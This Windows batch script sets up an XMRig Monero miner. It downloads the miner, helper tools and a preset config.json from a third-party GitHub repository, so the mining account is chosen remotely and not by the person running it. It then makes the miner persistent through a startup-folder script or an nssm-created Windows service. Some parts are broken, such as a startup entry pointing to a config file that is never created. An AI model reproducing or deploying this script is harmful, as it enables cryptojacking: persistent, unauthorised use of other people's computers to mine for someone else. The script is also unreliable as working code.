@echo off

set VERSION=1.0

rem printing greetings

echo XMRig mining setup script v%VERSION%.
REM echo ^(please report issues to support@moneroocean.stream email^)
REM echo.

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

REM rem command line arguments
REM set WALLET=%1
REM rem this one is optional
REM set EMAIL=%2

REM rem checking prerequisites

REM if [%WALLET%] == [] (
  REM echo Script usage:
  REM echo ^> setup_xmrig_miner.bat ^<wallet address^> [^<your email address^>]
  REM echo ERROR: Please specify your wallet address
  REM exit /b 1
REM )

REM for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
REM #call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
REM #if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
REM #if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
REM #echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
REM #exit /b 1

REM #WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  echo ERROR: Please define USERPROFILE environment variable to your user directory
  exit /b 1
)

if not exist "%USERPROFILE%" (
  echo ERROR: Please make sure user directory %USERPROFILE% exists
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    echo ERROR: This script requires "sc" utility to work correctly
    exit /b 1
  )
)

REM rem calculating port

REM set /a "EXP_MONERO_HASHRATE = %NUMBER_OF_PROCESSORS% * 700 / 1000"

REM #if [%EXP_MONERO_HASHRATE%] == [] ( 
 REM # echo ERROR: Can't compute projected Monero hashrate
  REM #exit 
REM #)

REM #if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
REM #if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
REM #set PORT=10001

REM :PORT_OK

REM rem printing intentions

set "LOGFILE=%USERPROFILE%\xmrig\xmrig.log"

echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
echo If needed, miner in foreground can be started by %USERPROFILE%\xmrig\miner.bat script.
REM echo Mining will happen to %WALLET% wallet.

REM if not [%EMAIL%] == [] (
  REM echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
REM )

REM echo.

if %ADMIN% == 0 (
  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
) else (
  echo Mining in background will be performed using xmrig_miner service.
)

echo.
echo JFYI: This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected xmrig hashrate is around %EXP_MONERO_HASHRATE% KH/s.
echo.

pause

rem start doing stuff: preparing miner

echo [*] Removing previous moneroocean miner (if any)
sc stop xmrig_miner
sc delete xmrig_miner
taskkill /f /t /im xmrig.exe

:REMOVE_DIR0
echo [*] Removing "%USERPROFILE%\xmrig" directory
timeout 5
rmdir /q /s "%USERPROFILE%\xmrig" >NUL 2>NUL
IF EXIST "%USERPROFILE%\xmrig" GOTO REMOVE_DIR0

REM echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
REM powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
REM if errorlevel 1 (
  REM echo ERROR: Can't download MoneroOcean advanced version of xmrig
  REM goto MINER_BAD
REM )

REM echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
REM powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
REM if errorlevel 1 (
  REM echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  REM powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  REM if errorlevel 1 (
    REM echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    REM exit /b 1
  REM )
  REM echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
  REM "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
  REM del "%USERPROFILE%\7za.exe"
REM )
REM del "%USERPROFILE%\xmrig.zip"

REM echo [*] Checking if advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
REM powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
REM "%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
REM if %ERRORLEVEL% equ 0 goto MINER_OK
REM :MINER_BAD

REM if exist "%USERPROFILE%\xmrig\xmrig.exe" (
  REM echo WARNING: Advanced version of "%USERPROFILE%\xmrig\xmrig.exe" is not functional
REM ) else (
  REM echo WARNING: Advanced version of "%USERPROFILE%\xmrig\xmrig.exe" was removed by antivirus
REM )

echo [*] Looking for the latest version of Monero miner
for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
  exit /b 1
)

REM :REMOVE_DIR1
REM echo [*] Removing "%USERPROFILE%\xmrig" directory
REM timeout 5
REM rmdir /q /s "%USERPROFILE%\xmrig" >NUL 2>NUL
REM IF EXIST "%USERPROFILE%\xmrig" GOTO REMOVE_DIR1

REM echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\xmrig"
REM powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\xmrig')"
REM if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MaratPlaksin17/XMRig/main/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking advanced "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\xmrig"
  "%USERPROFILE%\7za.exe" e -y  "%USERPROFILE%\xmrig.zip" -o"%USERPROFILE%\xmrig" "xmrig.exe" "WinRing0x64.sys" >NUL
  
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\xmrig"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
REM )
del "%USERPROFILE%\xmrig.zip"

REM echo [*] Checking if stock version of "%USERPROFILE%\xmrig\xmrig.exe" works fine ^(and not removed by antivirus software^)
REM powershell -Command "$out = cat '%USERPROFILE%\xmrig\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\xmrig\config.json'" 
REM "%USERPROFILE%\xmrig\xmrig.exe" --help >NUL
REM if %ERRORLEVEL% equ 0 goto MINER_OK

REM if exist "%USERPROFILE%\xmrig\xmrig.exe" (
  REM echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" is not functional
REM ) else (
  REM echo WARNING: Stock version of "%USERPROFILE%\xmrig\xmrig.exe" was removed by antivirus
REM )

REM exit /b 1

 REM :MINER_OK

echo [*] Miner "%USERPROFILE%\moneroocean\xmrig.exe" is OK

for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] (
  set PASS=na
)
REM if not [%EMAIL%] == [] (
  REM set "PASS=%PASS%:%EMAIL%"
REM )

REM powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
REM powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
REM powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
REM powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
REM set LOGFILE2=%LOGFILE:\=\\%
REM powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 

REM copy /Y "%USERPROFILE%\moneroocean\config.json" "%USERPROFILE%\moneroocean\config_background.json" >NUL
REM powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config_background.json'" 
REM powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MaratPlaksin17/XMRig/main/config.json', '%USERPROFILE%\xmrig\config.json')"
REM powershell -Command "New-Object Net.WebClient; .DownloadFile('https://raw.githubusercontent.com/MaratPlaksin17/XMRig/main/config.json', '%USERPROFILE%\xmrig\config.json')"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MaratPlaksin17/XMRig/main/config.json', '%USERPROFILE%\xmrig\config.json')"
  


rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0xmrig.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
echo :EXIT
) > "%USERPROFILE%\xmrig\miner.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

echo ERROR: Can't find Windows startup directory
exit /b 1

:STARTUP_DIR_OK
echo [*] Adding call to "%USERPROFILE%\xmrig\miner.bat" script to "%STARTUP_DIR%\xmrig_miner.bat" script
(
echo @echo off
echo "%USERPROFILE%\xmrig\miner.bat" --config="%USERPROFILE%\xmrig\config_background.json"
) > "%STARTUP_DIR%\xmrig_miner.bat"

echo [*] Running miner in the background
call "%STARTUP_DIR%\xmrig_miner.bat"
goto OK

:ADMIN_MINER_SETUP

echo [*] Downloading tools to make miner service to "%USERPROFILE%\nssm.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MaratPlaksin17/XMRig/main/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
  echo ERROR: Can't download tools to make miner service
  exit /b 1
)

echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\xmrig"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\xmrig')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MaratPlaksin17/XMRig/main/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\xmrig"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\xmrig" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\xmrig"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\nssm.zip"

echo [*] Creating xmrig_miner service
sc stop xmrig_miner
sc delete xmrig_miner
"%USERPROFILE%\xmrig\nssm.exe" install xmrig_miner "%USERPROFILE%\xmrig\xmrig.exe"
if errorlevel 1 (
  echo ERROR: Can't create moneroocean_miner service
  exit /b 1
)
"%USERPROFILE%\xmrig\nssm.exe" set xmrig_miner AppDirectory "%USERPROFILE%\xmrig"
"%USERPROFILE%\xmrig\nssm.exe" set xmrig_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\xmrig\nssm.exe" set xmrig_miner AppStdout "%USERPROFILE%\xmrig\stdout"
"%USERPROFILE%\xmrig\nssm.exe" set xmrig_miner AppStderr "%USERPROFILE%\xmrig\stderr"

echo [*] Starting xmrig_miner service
"%USERPROFILE%\xmrig\nssm.exe" start xmrig_miner
if errorlevel 1 (
  echo ERROR: Can't start xmrig_miner service
  exit /b 1
)

echo
echo Please reboot system if xmrig_miner service is not activated yet (if "%USERPROFILE%\xmrig\xmrig.log" file is empty)
goto OK

:OK
echo
echo [*] Setup complete
pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b




